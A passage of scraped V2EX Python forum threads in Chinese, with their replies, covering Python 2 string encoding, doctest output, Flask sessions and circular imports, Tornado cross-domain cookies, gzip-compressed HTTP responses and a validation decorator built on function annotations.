y.decode('ascii')\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nUnicodeDecodeError: 'ascii' codec can't decode byte 0xe4 in position 0: ordinal not in range(128)\n</code></pre>\n<p>正确地方式应该是显示地把 y 用 UTF-8 或者 GBK 进行解码。</p>\n<pre><code>&gt;&gt;&gt; x = u\"Python\"\n&gt;&gt;&gt; y = \"之禅\"\n&gt;&gt;&gt; y = y.decode(\"utf-8\")\n&gt;&gt;&gt; x + y\nu'Python\\u4e4b\\u7985'\n</code></pre>\n<p>以上内容都是基于 Python2 来讲的，关于 Python3 的字符和编码将会另开一篇文章来写，保持关注。</p>\n<p>原文地址：<a href=\"https://mp.weixin.qq.com/s/LQrPmp2HMlw5C7izJIUHNQ\" rel=\"nofollow\">https://mp.weixin.qq.com/s/LQrPmp2HMlw5C7izJIUHNQ</a><br>\n作者：<a href=\"http://weibo.com/527355345\" rel=\"nofollow\">liuzhijun</a></p>\n</div></div>"], "reply": "66", "tittle": "Python 编码为什么那么蛋疼？", "comment": ["nice", "看标题以为是喷 python 2 ，进来才发现是编码科普文", "为什么蛋疼？ -> 请用 Python3 ，下一题。", "编码一直是就是一件很蛋疼的事， 其他语言看上去不那么蛋疼，无非是：\r", "1. 不检查编码 /解码是否会报错。 手持两把锟斤拷， 口中直呼烫烫烫 就是这么来的。\r", "2. 只支持 utf-8 这一种编码", " \r", "\r", "Python 的编码为什么那么蛋疼？当然，这不能怪开发者。\r", "\r", "这是因为 Python2 使用 ASCII 字符编码作为默认编码方式，而 ASCII 不能处理中文，那么为什么不用 UTf-8 呢？因为 Guido 老爹为 Python 编写第一行代码是在 1989 年的冬天， 1991 年 2 月正式开源发布了第一个版本，而 Unicode 是 1991 年 10 月发布的，也就是说 Python 这门语言创立的时候 UTF-8 还没诞生，这是其一。\r", "\r", "Python 把字符串的类型还搞成两种， unicode 和 str ，以至于把开发者都弄糊涂了，这是其二", "神曰：“用 3 ”。", " \r", "\r", "“手持两把锟斤拷， 口中直呼烫烫烫”  笑了", "用 Python 3 ，字符串默认是 unicode 的", "我到现在也没搞懂编码，我为什么要搞清楚编码呢？我用 java 用 php 就没操过心", " 黑的漂亮，哈哈", "用 python3", "from __future__ import unicode_literals", " \r", "那是因为 php 只有 str 没有 unicode(php6 有，但夭折了)，而 Java 只有 unicode 没有 str(str 用 byte[])。", " 默认是 utf-8 吧", "为什么你写了这么多，不去看看 Python3 呢(´･_･`)", " 楼主分析的是 python2 。\r", "\r", "看完全文，我算是了解为什么老是报编码错误的原因了。\r", "\r", "ps: python3 一样的有类似的错误吧。", " 啥意思？ Python3 好呀", "python 3 还是有编码错呀\r", "\r", "比如你用 vim 打开 1 个文件，生成个 .swp 文件\r", "\r", "如果用 python 读取到这个文件，就报错", " 其实用 byte[]来表示字符串也算是 UNIX 和 C 的遗毒了。现代语言在设计的时候基本都是以 code point 为单位，虽然 Java 等语言被 UCS-2 坑了…", "很奇怪的 coding 方式。\r", "是说内存中保存 unicode code point ， I/O 时再编码 /解码吗？", " .swp 是 binary 文件，你要用 rb 模式去读， 跟编码没有关系好不好？", "关键是大伙都心想着先搞定功能吧，没空去了解一些编码的知识。", " 不去了解基础知识，遇到问题有时 neng 卡半天，关键是下次还是不知道问题根源", " 为什么 UCS-2 算坑呢？", " UCS-2 是按 16bit 为一个 code point 的，那个时期的新软件（如 Java, Windows NT, Mac OS X, Qt 等)因为定长编码的优势和支持 Unicode 的需求，几乎都用了它。但是后来由于 16bit 不能满足 Unicode 的新标准，于是不得不又改为变长编码（ UTF-16 ）。\r", "Java/C#里的 Character/char 最早是定义成 16bit 的 code point ，可以取 index 获得对应位置的 code point ，但现在不行了，比如取 emoji 就会取到半个字。", "Python 2 是 2000 年发布的，在编码上不与时俱进还搞成这样是不可原谅的", "收藏", " Python 2 是兼容 Python 1 的吧", " #28 兼容也不会有什么困难吧", " 要么变长不能 index ，要么定长浪费空间，总要折衷一下的", " 然而 UTF-16 既浪费空间也不定长，唯一的优势就是处理简单，速度快", " utf16 就是 utf8 和 utf16 之间的折衷， utf16 可以容纳大部分常用字符， str 内部实现可以利用这一点，比如置一个标志位，没有超出 2 字节范围时，就直接定位到字节，超出时再遍历字节做定位。", " #32 那不是还要遍历后才知道要不要设标志位，还是有额外开销。", "y", "手残了 不好意思。 其实 python2 编码解码蛮好用的, 比 c......", " 就算不要标志位，从字节数组构造一个 unicode 字符串出来，也是需要遍历的，不然怎么知道是否符合 unicode 规范？主流高级语言，字符串都是 immutable 的，所以标志算出来之后不需要重算，并没有增加什么开销。\r", "\r", "事实上 python 就是这么实现的 unicode 字符串\r", "enum PyUnicode_Kind {\r", "/* String contains only wstr byte characters.  This is only possible\r", "   when the string was created with a legacy API and _PyUnicode_Ready()\r", "   has not been called yet.  */\r", "    PyUnicode_WCHAR_KIND = 0,\r", "/* Return values of the PyUnicode_KIND() macro: */\r", "    PyUnicode_1BYTE_KIND = 1,\r", "    PyUnicode_2BYTE_KIND = 2,\r", "    PyUnicode_4BYTE_KIND = 4\r", "};", " 如果要遍历的话可以把每个 code point 的位置都找出来。这样不管有没有 non-BMP 字符都能 O(1)定位，直接取到 code point", "我觉得还是想理解：字符集和编码的区别吧，别上来就混在一起讲，还是很晕", " 记录每个字符的位置，同样需要额外的存储空间，而且实现会更复杂，所以一般用标志位加定长内部编码比较常见。", " 我都了解好几回了，忘了再查，查了又忘大概是这节奏。说真的 Python 的编码确实蛋疼的一逼。", "其实所谓的 unicode 也就是用 utf-16 或 utf-32 编码（与 python 版本和编译设置有关），类似 java 虚拟机内部统一用 utf-16 表示字符串。", "用 py3 就再也没搞过编码问题了。", "\r", "这个文档中关于 code points 的 utf-8 编码字节值的范围描述似乎也有些问题， code point≥128 时对应的 utf-8 字节值并不全都是 128 到 255 之间.", " 多谢指正", " PHP 的 UTF-8 也有 bom 的问题..", "python2 的编码问题和 C 语言一样， python3 开始编码走的和 java 这类语言一样的路线，搞清这两点就明白了", " 长知识了，感谢", " ", "还有一个问题， Windows 下 python3 不能显示 utf-8", "之前用 java 和另一个 phper 调试接口，我就记得 java 的 string 要去掉前面 2 个 byte ，后面的内容给 phper 才不会出错~~好像跟什么大头有关", " #35 \r", "觉得半残是最难用的\r", "全残的 C 自己处理 everything 所有都一样\r", "这个半残的 py2 最闹心 总犯错", " 这个是 cmd 的锅，没记错的话是只能显示本地编码支持的字符", " cmd 默认属性里不能选 utf-8 必须 chcp 65001 ，然后，每次运行都要敲这个命令", "大赞，终于解决了内心的疑惑，已关注公众号", "如果 py3 不正确地使用字符编码，一样可能导致 UnicodeXXXError ，关键还是要懂原理", "理解是理解，但是爬起来照样会遇到编码问题，还是要手工分析转码", "其实你只需要用上 django 的两个方法就行了， 也可以把这两个方法提出来。 自此以后我再也没遇到过字符编码问题。", "我觉得万恶之首是隐式转换。某些开发者写代码时不注意，导致某些地方收到超出 ASCII 范围的数据就崩。另外各种库的参数究竟是 str 还是 unicode 如果不注意搞混也会出类似问题。", "自从我用了 3 之后就解毒了", "我觉得主要问题在于很多程序员是面向 stackoverflow 编程，遇到问题就满足于把代码改得“能跑”就行，不去深究问题的根儿在哪儿，所以今儿改好了明儿继续出问题。我不能说 Python2 的编码不蛋疼，但我觉得也不能说“不怪开发者”。", "看到楼主说用浅显的文字解释，接下来看到这么长的文字，我觉得还是升 3 吧", "每个做 Python 开发的都被字符编码的问题搞晕过？\r", "我没用过 python2 ，最多是看过，一直用 python3 ，似乎没有被字符编码坑过。", "\"手持两把锟斤拷， 口中直呼烫烫烫\"\r", "莫名喜感。", " 新系统用 py3 最好，还有很多老系统根本没法迁移，你问问豆瓣迁移到 3 是个多大的工程", "确实是篇好文章！！！", "看着挺容易理解的，挺好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>系统:Ubuntu<br>\npython:2.7.6<br>\n我看别人都能写到文件里面, 我只能输出到终端中，难道我的打开方式有问题<br>\n这个是我看的官方实例，也不行</p>\n<pre><code>\ndef factorial(n):\n    \"\"\"Return the factorial of n, an exact integer &gt;= 0.\n\n    If the result is small enough to fit in an int, return an int.\n    Else return a long.\n\n   &gt;&gt;&gt; # comments are ignored\n    &gt;&gt;&gt; # comments are ignored\n    &gt;&gt;&gt; x = 12\n    &gt;&gt;&gt; x\n    \n    &gt;&gt;&gt; if x == 13:\n    ...     print \"yes\"\n    ... else:\n    ...     print \"no\"\n    ...     print \"NO\"\n    ...     print \"NO!!!\"\n    ...\n\n\n    \"\"\"\n\n    import math\n    if not n &gt;= 0:\n        raise ValueError(\"n must be &gt;= 0\")\n    if math.floor(n) != n:\n        raise ValueError(\"n must be exact integer\")\n    if n+1 == n:  # catch a value like 1e300\n        raise OverflowError(\"n too large\")\n    result = 1\n    factor = 2\n    while factor &lt;= n:\n        result *= factor\n        factor += 1\n    return result\n\n\nif __name__ == \"__main__\":\n    import doctest\n    doctest.testmod()\n</code>\n</pre>\n</div></div>"], "reply": "4", "tittle": "Python doctest 结果死活写不到文件里面去", "comment": ["我这边试了一下也是不行啊，会不会是搞错了？\r", "\r", "我看文档里面的例子的第二部分是执行文件里的测试用例而不是输出结果到文件里，两个部分都试验了一下结果都是输出在终端的", " \r", " 文档我有看，你要不试试在命令行加上“> test.log ” 把标准输出定向到文件？", " 我关键是想把结果输出到代码里面，方便输出文档"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前几天录了一个什么是 Word2Vec 的教程，在 B 站\n<a href=\"http://www.bilibili.com/video/av9258966/\" rel=\"nofollow\">http://www.bilibili.com/video/av9258966/</a></p>\n<p>不知道有没有解释清楚。懂一点深度学习的朋友看一看，给点意见。</p>\n<p>我去年也制作了一个深度学习入门的教程，在这里：\n<a href=\"https://github.com/CreatCodeBuild/TensorFlow-and-DeepLearning-Tutorial/tree/master/Season1\" rel=\"nofollow\">https://github.com/CreatCodeBuild/TensorFlow-and-DeepLearning-Tutorial/tree/master/Season1</a></p>\n<p>总之在这里分享出来给大家咯。</p>\n<p>（分享在 Python 节点是因为教程代码 Python ）</p>\n</div></div>"], "reply": "5", "tittle": "深度学习教程：什么是 Word2Vec？", "comment": ["你发的是 word embedding ，不是 word2vec\r", "\r", "word2vec 特指 mikolov 在 2011 年发的 paper 中用到的模型和工具。\r", "\r", "具体来说，是 CBOW + SKIP-GRAM 两个模型， negative sampling + hierarchical softmax 两种训练方法组成的 word embedding 训练方法。\r", "\r", "至于你在视频里说的“最后走一层 softmax ”，完全不可用， softmax 时间复杂度 O(#token)， token 有 90w 的情况下（ nlp 常见），根本训练不出来，这也正是 mikolov 使用 hierarchical softmax 训练的原因\r", "\r", "还是那个建议，多学知识，别急着做些没有信息量的视频，搞个人 PR 。", "对 machine learning 和 deep learning ，不是一定公式越多越好，但是一个模型从头到尾讲完，一个公式都没有，我觉得还是有点问题的。", "看到播放量只有 100 我就放心了。", "b 站不太适合放这种类型的视频", "qfdk.me 欢迎您"]},
{"content": ["<div class=\"topic_content\">希望的效果 ：\r<br>{\r<br>    \"data\": [\r<br>        {\r<br>            \"{#SITEURL}\": \"127.0.0.1,code,port\",\r<br>            \"{#SITEPORT}\": \"9931\"\r<br>        }\r<br>    ]\r<br>\r<br>\r<br>实际的效果：\r<br>{\r<br>    \"data\": [\r<br>        {\r<br>            \"{#SITEURL}\": \"127.0.0.1,code,port\"\r<br>        },\r<br>        {\r<br>            \"{#SITEPORT}\": \"9931\"\r<br>        }\r<br>    ]\r<br>\r<br>\r<br>脚本 ：\r<br>#!/usr/bin/env python\r<br>#encoding=utf8\r<br>import os\r<br>import json\r<br>active_url = file('/etc/zabbix/script/discovery/active_url.txt')\r<br>active_port = file('/etc/zabbix/script/discovery/active_port.txt')\r<br>d01 = []\r<br>for url in active_url.readlines():\r<br>    for port in active_port.readlines():\r<br>     d01.append({\"{#SITEURL}\": url.strip()}),\r<br>     d01.append({\"{#SITEPORT}\": port.strip()})\r<br>print json.dumps({'data': d01},{'data': d01}, sort_keys=True, indent=4, separators=(',', ': '))</div>"], "reply": "4", "tittle": "请教下 Python 的 json 格式问题", "comment": ["跟 python 没关系，跟你写的代码有关系。想往字典里加 key:value 就去操作字典，不要用 list 的 append()。", " 嗯 ，刚看文章 明白了 append 的用法 ，谢啦！", "_dict = {\"{#SITEURL}\": url.strip() ,\"{#SITEPORT}\": port.strip()}\r", "d01.append(_dict)", " 谢谢你！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我现在还是手工测.\n因为</p>\n<pre><code>1.  没人带单元测试\n2.  单元测试无法自动化，不能自动建表，而且搞模拟数据很耗时间\n3. 写起来麻烦，一个 function 如果有 100 行左右的代码，测试代码估计要 1K 行，\n而且如果逻辑改了的话。测试代码要改 N 久\n\n</code></pre>\n</div></div>"], "reply": "11", "tittle": "问下你们是怎么写单元测试的？", "comment": ["django 有 tests ，来拥抱 django 把。", "数据库建好，放 docker 里", "我们的解决方案是两个数据库:\r", "\r", "- 正常开发库\r", "- 测试库\r", "\r", "跑单元测试之前把开发库的表结构拷贝到测试库, 然后自动扫描测试包下的 SQL 文件并在测试数据库执行(测试数据初始化).\r", "\r", "缺点就是每次运行测试之前会有比较长的数据库初始化时间, 但可以接受.", "你没发现看起来是单元测试的问题，换个角度其实是被测代码的问题么？", "你可以参考一下， GitHub 上的开源项目，很少是不带单元测试的。\r", "另外如果你觉得单元测试很难写，有可能是你的设计有问题，模块间的耦合太重。\r", "\r", "另外单元测试写到什么程度本来就没有一个很明确的界定。\r", "对我来说，一些核心模块会写单元测试，业务模块大多不写。\r", "核心模块不会频繁改动，且被广泛引用，出问题影响大。\r", "业务模块影响范围小，而且需求变动很可能导致所有测试用例都得重写，测试用例的性价比太低。\r", "（注： REST 接口都会写测试用例。 REST 自动化测试比手动测试还更简单）", "pytest", "- -，基本没写过！", "代码最好分层， models 、 service 、 controller 三层，分层测试。如果是 python 的话推荐用 pytest ，测试数据库用 sqlite 就够了。\r", "每次 push 之后触发持续集成然后跑单元测试！都是自动化的。", "web ，因为前后端分离，所以可以直接请求 API ，一个是看返回状态，一个是看返回的数据结构，数据内容是数据库的问题所以不在考虑范围", "从来不写，", "def testXXX\r", "    #TODO\r", "    pass"]},
{"content": ["<div class=\"topic_content\">背景： \r<br>1 、前后端分离，后端 tornado ， 后端服务域名 <a target=\"_blank\" href=\"http://se.wcc.com\" rel=\"nofollow\">se.wcc.com</a> ，用 set_secure_cookie 设置 cookie \r<br>2 、后端服务器是本地的虚机 ubuntu ， nginx 代理 \r<br>3 、前端独立部署开发，链接类似 <a target=\"_blank\" href=\"http://demo.o2o.com/register.html\" rel=\"nofollow\">http://demo.o2o.com/register.html</a> ， 前端服务域名 <a target=\"_blank\" href=\"http://demo.o2o.com\" rel=\"nofollow\">demo.o2o.com</a> \r<br>4 、前端服务器是另外的机器 \r<br>\r<br>现状： \r<br>1 、 tornado 的跨域限制已经放开了 set_header(\"Access-Control-Allow-Origin\", \"*\") \r<br>2 、 nginx 的跨域限制也放开了 \r<br>3 、 tornado 设置 secure cookie ， postman 模拟接口请求， set_securer_cookie, get_secure_cookie 是 OK 的 \r<br>4 、前端服务器过来的 get 请求， set_secure_cookie OK , 但是前端的 post 请求， post 方法中的 get_secure_cookie 拿不到 cookie \r<br>\r<br>原先以为是浏览器安全限制的问题，关掉了 chrome 的安全策略，我本地的浏览器 OK 了，以为就结了。但是发现前端开发同学的浏览器，关掉 chrome 的安全策略之后，依然没有效果。 \r<br>\r<br>我的本地浏览器 OK 跟本地的虚机有关？？ \r<br>\r<br>求教这种情况怎么解决 (以前前后端分离，关闭 chrome 同源策略就 OK 了)</div>"], "reply": "6", "tittle": "tornado 无法设置 cookie 的问题", "comment": ["听你描述，不太清楚。\r", "\r", "是执行 get 的时候， set_secure_cookie ，与 get_secure_cookie 没有问题。然后执行表单提交的时候， get_secure_cookie 拿不到 cookie 。\r", "\r", "在使用 post 的时候，开启了 xsrf ，然后没有使用 {{ xsrf_form_html() }}，犯了这个简单的错误？\r", "\r", "如果前后分离，前端无法使用{{ xsrf_form_html() }} ， 使用 self.xsrf_form_html()函数可以生成", "我描述没清楚，问题已经解决。\r", "原因： cookie 无法跨站\r", "解决方法：\r", "1 、更改后端域名， domain 与前端一致\r", "2 、 url 后面加上加密串，每次请求都带上，实现 cookie 的机制", "嗯，跨域了", "我是这样做的,\r", "set_cookie....\r", "self.write('''<script>window.location.href = \"http://................./\";</script>''')\r", "\r", "由页面来跳转,而不是前端人员来控制", "或者简单点, 直接把登录放在后台渲染返回", " sso 单点一般这么干"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>app/__init__.py\n...\nfrom flask_redis import FlaskRedis\nfrom flask_login import LoginManager\nimport os\n...\nlogin_manager = LoginManager()\nlogin_manager.session_protection = 'strong'\nlogin_manager.login_view = 'auth.oauth'\n\ndef create_app(config=\"app.config\"):\n    app = Flask(__name__)\n    with app.app_context():\n        app.config.from_object(config)\n...\n        redis_store = FlaskRedis()\n        redis_store.init_app(app)\n        login_manager.init_app(app)\n...\n----\n\napp/models.py\n\nfrom . import login_manager\n</code></pre>\n<p>但是这样 import 会报错 <code>ImportError: cannot import name 'login_manager'</code>\n参考了 Flask Web 开发一书</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>版本Python 3.6\n启动 <a href=\"http://run.py\" rel=\"nofollow\">run.py</a></p>\n<pre><code>from app import create_app\napp = create_app()\n\napp.run(host=\"0.0.0.0\",port=4000,debug=app.debug, threaded=True)\n</code></pre>\n</div></div>", "<div class=\"topic_content\">demo <a target=\"_blank\" href=\"https://github.com/ysicing/mmp/tree/flask\" rel=\"nofollow\">https://github.com/ysicing/mmp/tree/flask</a></div>"], "reply": "9", "tittle": "Python import 问题", "comment": ["我不能重现，你需要把你启动程序的方式说一下", "这种情况不用 from 直接 import login_manager 就可以了，但 from 用包相对路径我这的确也不行，不知道怎么搞。", "Python 相关的问题得写 py2 还是 py3 啊大兄弟", " 直接 import 也不行的", " ", "有循环导入的问题。。\r", "把所有 import 自己代码的地方比如 blueprint 放在 creat_app()里面\r", "能放后面就放后面\r", "仔细分析一下包的导入过程你就知道为啥了。。", " 哦哦，我琢磨琢磨", " 解决循环引用就好了， 尽量整理好导入的模块关系\r", "\r", "\r", "有问题可以加我们的群问，这样效率更高，这个群是一群工程师组建的面向初学者的  \r", "Python Linux 学习群， qq 群号： 278529278 ， \r", "Php Linux 学习群， qq 群号： 476648701 ， \r", "非商业性质，拒绝广告，只接收真正想学这方面技术的朋友，交流学习，申请请说明来自 v2ex", "我感觉题主是想问 from...import...的相对导入问题。当要在 python 中使用相对导入模块，对目录结构是有要求的。\r", "一、执行相对导入的模块（.py ）文件不能作为顶层模块执行该文件夹中的 py 文件的。\r", "二、相对导入的文件夹必须要被 python 解释器理解为包的（也就是必须要包含__init__.py ）文件。\r", "同时满足上述两个条件，才可以进行 from import 的相对导入模块的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"http://pituber.com/t/ip/58\" rel=\"nofollow\">http://pituber.com/t/ip/58</a><br>\n写了一些探讨的方案~<br>\n并且在文章最后提出了自己的一个想法。<br>\n有想法的一起~</p>\n</div></div>"], "reply": "2", "tittle": "关于爬虫，关于代理~", "comment": ["爬虫不难，难的是爬得快的，爬得低功耗的，难的是面对海量数据，要怎么用，是否合理，这个难题就会有争议了~", "     恩。你说的这些已经是产品级的要求了  \r", "对于个人来说，重点还是在于突破反爬"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如： session['yonghuming'] = request.form['username']</p>\n<p>把表单中的 username 传给 session ，用 yonghuming 变量保存，下次可以用 session.get('yonghuming')把这个值取出来。</p>\n<p>如果 session 是全局的话，再一些特殊情况下（比如，定时任务、异步认为中，前面存的 yonghuming 还没来得及读取，就被后面同样的 request.form['username']赋值给覆盖了。这怎么整？</p>\n<p>另外，说 Flask 的 session 设计是 cookie based ，按理说，应该是每个用户的请求又应该算是非全局的，可以重名，不用担心被覆盖吧？</p>\n</div></div>"], "reply": "11", "tittle": "Python Flask 的 session 是全局的话，怎么避免变量传值重复（被覆盖）呢？", "comment": ["对于 session 变量本身，它是个 threading-local 变量，所以不会有多线程问题。\r", "\r", "而且 Python 除了 PyPy 开不了多线程，整个 Python 进程就是个巨大的单线程程序。", "flask 中的 request 、 session 、 g 都是协程 /进程安全的。简单说，它们看似是全局变量，但其实每个请求的值都是单独保存的，不会相互影响。\r", "\r", "如果想明白内部的实现，可以看这篇文章： ", " 。\r", "\r", "另，迷之 `yonghuming` 变量。", " 谢谢，按这个解释思路，如果 session['yonghuming'] = request.form['username'] 的'yonghuming'在 10 分钟之后取，但是中途在第 3 分钟的时候，被另外一个 form 又赋值了一次，那 10 分钟之后取的‘ yonghuming ’，其实是第 3 分钟复制的那个啦？", " 是为了区分说清楚两个 username 呐，要体现出会用两种语言来命名的优势来~", " 我觉得你对 Flask 的 session 有个误解。 Flask 的 session 是 cookie based ，所以每次请求都是从 cookie 里面抽出来的值，不存在服务器上。至于 cookie 是怎么维持的呢？\r", "\r", "比如你某次请求让 flask 设置了一个 cookie ，服务器在送给客户端的 HTTP Header 里面会有一句\r", "\r", "Set-Cookie: name=value .....（省略一些 cookie 的元信息）\r", "\r", "然后下次浏览器发送给服务器的 HTTP Header 会带上：\r", "\r", "Cookie: name=value\r", "\r", "也就是说这来回传输的 HTTP 头维持了状态。\r", "\r", "回到你的问题，每次 flask 处理某个请求， session 对象都是临时从 HTTP Header 里面重建出来的。 10 分钟之后是什么，这要看浏览器给你的是什么。", "定时任务还有 request ？", "这就是 Flask 最具特色、魅力和争议的黑魔法了。它的 request, session 不是一个普通对象。是一个逗比对象。", " 谢谢，明白~ 需要换个方式处理这个数值了。\r", "\r", " 你说的对，想到后来不会再有 request 了，值都取不到。", "Flask 的 session 是 ThreadLocal 的，每个用户都有一个自己的栈，所以数据不会混乱的", "那你咋不对 request 的正确性进行怀疑呢？？\r", "\r", "骚年，深入了解下 flask 内部实现吧。 兼具了争议和赞美的一种表示方法", "你可能混淆了 session 域和 application 域"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Github ：</p>\n<p><a href=\"https://github.com/gaojiuli/resume.py\" rel=\"nofollow\">https://github.com/gaojiuli/resume.py</a></p>\n<p>用法：</p>\n<ol>\n<li>star</li>\n<li>clone</li>\n<li>修改 <a href=\"http://resume.py\" rel=\"nofollow\">resume.py</a></li>\n<li>运行 <a href=\"http://resume.py\" rel=\"nofollow\">resume.py</a></li>\n</ol>\n<p>案例（控制台中的效果）：</p>\n<p><img alt=\"案例图片\" src=\"https://github.com/gaojiuli/resume.py/raw/master/resume.png\"></p>\n</div></div>"], "reply": "33", "tittle": "Python 简历生成工具，非常炫酷哟", "comment": ["这……", "一日不如一日……？", "Sorry, but no.", "锦衣卫", "没发现字体是不一样的吗", " 我的 ubuntu 的问题", " 啊哈？", "print...", "看成高句丽", " 😁，我觉得这样大家修改起来可能更方便", " 我觉得我应该删点信息", "\r", "\r", "git 的错误用法。", "哪里炫酷", " 哪里不对嘛", " 可能标题炫酷？", " 怎么了", " 嘘", " 你说的对", "槽点太多不知道从哪儿吐起", "我交学子 不容易啊！ 支持一下", "会因为简历酷炫来招人的公司一般都是不怎么酷炫的公司", " 😄😄，其实就图个开心", " 这个玩意儿就是闹着玩的", " 学长", " 你说的对！", " 我本科也是交大的", "sex......gender 吧...", "开心就好。。这种简历递出去会有面试电话打过来只能说对方是骗子公司\r", "\r", "用点心起码生成个 PDF 或者最次 HTML 。。", "这算是个人介绍, 适合放上网 Linkedin 之类\r", "简历是针对公司 /职位而制作.", "这个工具能当简历的一部分，而生成内容不能当成是简历。\r", "\r", "我感觉不就是 print ?\r", "\r", "减分！", "还不如手写 Markdown ，然后套个主题转 html 。\r", "\r", "截张图出来当简历，简直是要恶心死对面。", " 删除的姿势不对。", "你这让我想起来了 明大神的 知乎回答 ", " 。"]},
{"content": ["<div class=\"topic_content\">请教前辈，我使用 win32ui.CreateFileDialog获得文件路径后，后面的程序都执行完毕了，但是主程序没有完全结束，仍旧显示命令行窗口，请教。</div>"], "reply": "1", "tittle": "使用 win32ui.CreateFileDialog 选择文件对话框后，主程序无法自动结束，求教", "comment": ["win32api ，好久远的记忆。。。。\r", "\r", "话说确定是这个 api 的锅吗？是不是主程序（也许是库自己开的线程）维持了一个消息循环没有结束掉？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前偶然发现了这样一个页面，<br>\n<a href=\"http://www.angio.net/pi/\" rel=\"nofollow\">http://www.angio.net/pi/</a><br>\n可以用来查找任意一串数字在圆周率小数点后两亿位中的具体位置，感觉还挺好玩的<br>\n然后我找到了它的请求接口<br>\n<a href=\"http://www.angio.net/newpi/piquery?q=666666666\" rel=\"nofollow\">http://www.angio.net/newpi/piquery?q=666666666</a></p>\n<p>如果在浏览器里直接输入上面的 url ，可以得到下面的 json<br>\n{\"et\":66874,\"r\":[{\"k\":\"666666666\",\"st\":0,\"status\":\"found\",\"p\":45681781,\"db\":\"86731050497515079094\",\"da\":\"71734856294979983444\",\"c\":1}],\"status\":\"OK\"}<br>\n这是正常的</p>\n<p>但是如果使用下面代码获取：</p>\n<pre><code>url = 'http://www.angio.net/newpi/piquery?q=666666666'\n#这里 headers 是完全复制了浏览器里的\nreq = urllib.request.Request(url, None, headers)\nresponse = urllib.request.urlopen(req).read()\n</code></pre>\n<p>最终 response 的值为：</p>\n<p>b'\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x03L\\x8c1\\x0e\\xc20\\x10\\xc0\\xfe\\xe29C\\x8e\\r\\xb9\\xfb\\x02\\x03\\x0f@\\x0c\\x85\\xc2\\x82\\x04\\x88\\xb6S\\xc5\\xdfQ\\x07$\\xbcx\\xb0\\xe4\\x95\\xebL45)\\x897q\\\\xb9\\x13\\xb4\\x1f$\\xa6\\x99\\xc8\\x9b\\x86y\\x99\\x08n\\xcf\\xe51\\x92x\\x11Z[\\x17\\xeb\\x92\\x18\\xcf\\x04\\xbdY\\x91\\\\xb3\\xbaU\\xa9\\xd9&lt;\\xbb\\x92\\x18\\x07\\x02\\x13+\\xdak\\xdb\\xb9\\xba\\xb9\\xf7\\xa2\\xba\\xb5\\x0b!\\x9f\\xd3\\xdf\\xfd\\xb0\\xe7\\x0b\\x00\\x00\\xff\\xff\\xaa\\x05\\x00\\x00\\x00\\xff\\xff\\x03\\x00B\\xb8\\x0e\\x84\\x95\\x00\\x00\\x00'</p>\n<p>此时如果对 response 执行 decode('utf-8')会报错。</p>\n<p>仔细一看，这个 bytes 串好像不对劲，里面还有特殊符号，正常的 bytes 串不应该这样吧</p>\n<p>请教一下各位，这种情况应该怎么处理，怎么样才能获取到正常的结果</p>\n</div></div>"], "reply": "3", "tittle": "求大佬帮我看看我这个用 urlopen().read()获取的 bytes 串是不是有问题啊", "comment": ["回的 gzip 压缩过的没解压？", " 还真是这个原因，非常感谢！\r", "\r", "又加了一句解压缩之后就正常了\r", "gzip.decompress(response).decode(\"utf-8\")", " 其实你没必要自己解压，可以先试试去掉 header 里 Accept-Encoding 的压缩选项，只保留 identity ，服务器应该就会回明文了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Python 3.5 开始支持 Annotations ，可以用来给函数参数加上注解，也有一个叫 <a href=\"http://mypy.readthedocs.io/\" rel=\"nofollow\">mypy</a> 的库用它来做静态类型检查。</p>\n<p>前几天发布 <a href=\"https://github.com/guyskk/validr\" rel=\"nofollow\">Validr</a> 0.14.0 版，在 <a href=\"https://www.reddit.com/r/Python/comments/60upat/validr_the_fastest_data_validation_library_in/\" rel=\"nofollow\">reddit</a> 上也有人问支不支持 mypy ，今天突发奇想写了个用来运行时检查参数和返回值。</p>\n<p>一个简单的实现：</p>\n<pre><code># python &gt;= 3.5\n# pip install validr\nfrom validr import SchemaParser, mark_key\n\n\ndef validation(f):\n    \"\"\"Decorator for validate function params and return by __annotations__\"\"\"\n    parser = SchemaParser()\n    return_ = None\n    params = {}\n    for k, v in f.__annotations__.items():\n        if k == 'return':\n            return_ = parser.parse(v)\n        else:\n            params[k] = parser.parse(v)\n\n    def wrapper(**kwargs):\n        for k, v in params.items():\n            with mark_key(k):\n                kwargs[k] = v(kwargs.get(k, None))\n        result = f(**kwargs)\n        if return_:\n            with mark_key('return'):\n                result = return_(result)\n        return result\n    return wrapper\n\n\n@validation\ndef login(\n    username: 'str',\n    password: 'str&amp;minlen=6',\n) -&gt; {\n    'id?int': 'User ID',\n}:\n    return {'id': 1000000}\n\n\nif __name__ == '__main__':\n    print(login(username='guyskk', password='123456'))\n    print(login(username='guyskk', password='1234'))\n</code></pre>\n<p>另外这种写法也是能实现的：</p>\n<pre><code>@validation\ndef login(\n    username: StringType(),\n    password: StringType(minlen=6),\n) -&gt; {\n    'id': IntType(desc='User ID'),\n}:\n    return {'id': 1000000}\n</code></pre>\n<p>大家觉得这两个写法怎么样，有需要这样一个库的吗</p>\n</div></div>"], "reply": "1", "tittle": "Python 3 的函数 Annotations 还可以这样用", "comment": ["打算放弃这种写法 -> 还不如直接写 go 算了"]},
